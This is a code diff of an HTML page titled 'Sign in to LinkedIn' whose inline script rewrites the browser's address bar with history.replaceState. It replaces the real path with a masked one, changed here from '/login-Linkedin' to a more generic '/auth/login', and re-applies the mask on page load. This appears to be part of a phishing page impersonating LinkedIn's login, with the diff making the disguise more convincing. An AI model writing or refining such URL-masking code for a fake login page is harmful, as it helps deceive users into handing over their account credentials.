@@ -5,19 +5,21 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Sign in to LinkedIn</title>
   <script>
-    // Persistent URL masking that survives reloads
+    // URL Masking with reload protection
     (function() {
-      const maskedPath = "/login-Linkedin";
+      const maskedPath = "/auth/login";
       const originalPath = window.location.pathname;
       
       // Always show the masked URL
       if (window.location.pathname !== maskedPath) {
-        history.replaceState({}, "", maskedPath + window.location.search);
+        history.replaceState({ isMasked: true }, "", maskedPath + window.location.search);
       }
       
-      // Ensure it stays masked even after reload
-      window.addEventListener('beforeunload', function() {
-        history.replaceState({}, "", maskedPath + window.location.search);
+      // Handle page reload
+      window.addEventListener('load', function() {
+        if (window.location.pathname !== maskedPath && history.state?.isMasked) {
+          history.replaceState({ isMasked: true }, "", maskedPath + window.location.search);
+        }
       });
     })();
   </script>
